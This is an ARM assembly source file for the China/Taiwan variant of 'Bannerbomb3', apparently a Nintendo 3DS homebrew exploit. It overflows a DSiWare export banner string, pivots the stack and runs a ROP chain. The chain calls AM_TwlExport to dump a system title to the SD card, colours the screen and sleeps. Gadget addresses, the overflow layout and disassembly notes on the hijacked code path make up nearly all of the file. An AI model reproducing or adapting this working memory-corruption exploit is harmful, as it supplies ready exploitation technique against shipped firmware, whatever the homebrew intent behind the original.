.arm
.text
							@ China, Taiwan Bannerbomb3
#include "defines_taiwan.h"
#define SP_SP_ADD20_LDMFD_R4R7PC 0x00188D48		@ Nice easy stack pivot directly to payload

	.global	_start
@--------------------------------------------------------------------------------- ROP chain payload ( AM_TwlExport() )
_start:				
	@ Starts at stack address 0x0ffffe48, size 0x100. This is the DSiWare export banner title string that will crash the stack at string + 0xEC.
	@ Different languages load different string offsets in the banner, but they all get moved to the same address: 0x0ffffe48.	
	@ The exploit code that pivots to this payload is further down at "Exploit Gadgets begin"
	
	.word POP_R0PC					@ ------------ Write null to end of DSiWare export string.
		.word null_addr				@ 	Dest address of null char
	.word ROP_MOV_R1_0				@ 
		.word GARBAGE				@ 	r4
	.word ROP_STR_R12R0				@ 
		.word GARBAGE				@ 	r4
	.word POP_R0PC					@ ------------ Begin filling in args for AM_TwlExport. This is a nice wrapper function for AM_ExportTwlBackup().
		.word INT				@ 	Tidlow of DS Internet
	.word POP_R1PC					@ 
		.word TID_H				@ 	Tidhigh of system dsiware
	.word POP_R2PC					@ 	
		.word dsINT				@ 	Address of export's file string (below)
	.word POP_R3PC					@ 
		.word WBUFF				@ 	128KB workbuff supplied to AM_TwlExport
	.word AM_TwlExport				@   	AM_TwlExport(u32 tidlow, u32 tidhigh, char *export_path, *wbuff)
		.word GARBAGE				@	r4
		.word GARBAGE				@	r5
		.word GARBAGE				@	r6
		.word GARBAGE				@	r7
	.word ROP_MOV_R3_4_JUNKTOR0			@ ------------ Color the screen so users know something good is happening 
		.word GARBAGE				@ 	r4
		.word GARBAGE	    			@ 	r5
		.word GARBAGE	    			@ 	r6
		.word GARBAGE	    			@ 	r7
		.word GARBAGE	    			@ 	r8
	.word POP_R0PC          			@
		.word GSPGPU_SERVHANDLEADR		@ 	GSGPU Handle already present in memory
	.word POP_R1PC					@
		.word HWREGS_ADDR      			@ 	Register address for bottom screen coloring
	.word POP_R2PC          			@
		.word MAGENTA_ADDR  			@	Existing location of magenta color 
	.word GSPGPU_WriteHWRegs			@   	GSPGPU_WriteHWRegs(&GSPHandle, HwRegsAddress, &MagentaAddr, size=4)
		.word GARBAGE	    			@ 	r4
		.word GARBAGE	    			@ 	r5
		.word GARBAGE				@ 	r6	
	.word ROP_MOV_R1_0				@ ------------ Wait a little bit to make sure export completes before the crash
		.word GARBAGE				@	r4
	.word POP_R0PC					@
		.word 0xFFFFFFFF			@	r0 ... r1 is zeroed above
	.word svcSleepThread				@   	svcSleepThread(u64 0x00000000FFFFFFFF) this is about 4 seconds.
		
	
		
dsINT: // this is "sdmc:/42383841.bin" wchar in ascii.  I had to do it this way to avoid a wchar null at the end
	.ascii "s\0","d\0","m\0","c\0",":\0","/\0","4\0","2\0","3\0","8\0","3\0","8\0","4\0","1\0",".\0","b\0","i\0","n\0" 
null_addr:

@--------------------------------------------------------------------------------- Padding
	
	.fill	((_start + 0xEC - null_addr)/4),4, GARBAGE

@--------------------------------------------------------------------------------- Exploit gadgets begin
							@ (x) x = The order of execution of the following gadgets
	.word SP_SP_ADD20_LDMFD_R4R7PC			@ (4) stack pivot 
	.word 0x0FFFFEE8				@ (3) points to stack pivot
	.word 0x0FFFFF18				@ (2) points to (3)
	.word 0x0FFFFEE4				@ (1) r0 ENTRYPOINT - points to previous word
	.word GARBAGE					@ mset nulls half of this word so we can't do much with it

@--------------------------------------------------------------------------------- End
@---------------------------------------------------------------------------------
@---------------------------------------------------------------------------------




@--------------------------------------------------------------------------------- Notes

/*  NOTES on the exploit gadget section
		;from the string overflow, we control r0.
		;the second asm list is functionally the same the first but with "don't care" instructions removed.
		;the reason for a different exploit codepath is a different stack context than the US/EU.. version.
		;the 1 export .bin method yielded an unusable context, in fact. so i had to move the exploited .bin to the second page in the dsiware export menu.
		;this yielded the much better stack context seen below.
original__________________________________________________________________
ROM:001B9A5C                 LDR             R0, [R0,#0x34]
ROM:001B9A60                 MOV             R1, R2
ROM:001B9A64                 MOV             R8, R3
ROM:001B9A68                 LDR             R6, [SP,#0x28+arg_0]
ROM:001B9A6C                 LDR             R2, [R0]
ROM:001B9A70                 LDR             R3, [R2,#0x2C]
ROM:001B9A74                 MOV             R2, #1
ROM:001B9A78                 BLX             R3

simplified___________________________________r0=0x0FFFFEE4 + 4_____________ (4 is added by previous code)	
ROM:001B9A5C                 LDR             R0, [R0,#0x34] ;r0=0x0FFFFF18
ROM:001B9A6C                 LDR             R2, [R0]       ;r2=0x0FFFFEE8
ROM:001B9A70                 LDR             R3, [R2,#0x2C] ;r3=stack pivot addr
ROM:001B9A78                 BLX             R3	 	    ;code!
	
*/